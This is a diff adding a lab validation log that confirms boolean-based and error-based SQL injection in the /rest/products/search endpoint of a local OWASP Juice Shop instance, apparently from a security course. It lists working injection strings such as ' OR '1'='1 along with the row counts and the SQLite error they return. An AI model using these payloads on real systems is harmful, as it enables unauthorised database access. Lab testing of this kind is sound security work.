@@ -1,0 +1,20 @@
+===================================================================
+ V-009 SQL INJECTION IN /rest/products/search - VALIDATION
+ captured : 2026-10-04T21:40:20+05:30
+ target   : http://127.0.0.1:3000
+ lab      : /home/asta/Desktop/Cyber-Security/cybersecurity-cs02/lab/juice-shop_20.2.0 pid=46277 via /home/asta/.nvm/versions/node/v22.23.3/bin/node (v22.23.3)
+===================================================================
+Objective: prove boolean-based SQL injection via row-count differential.
+Method:    GET /rest/products/search?q=<payload>, count returned rows.
+
+  q=apple                  -> 3 rows
+  q=zzzznotfound           -> 0 rows
+  q=' OR '1'='1            -> 46 rows
+  q=' AND '1'='2           -> 0 rows
+
+Error-based probe (leaks DB engine + message):
+  q=' OR 1=1--
+    Error: SQLITE_ERROR: incomplete input
+      500 Error: SQLITE_ERROR: incomplete input
+
+RESULT: 3 rows vs 46 rows = boolean SQLi CONFIRMED (OPEN).
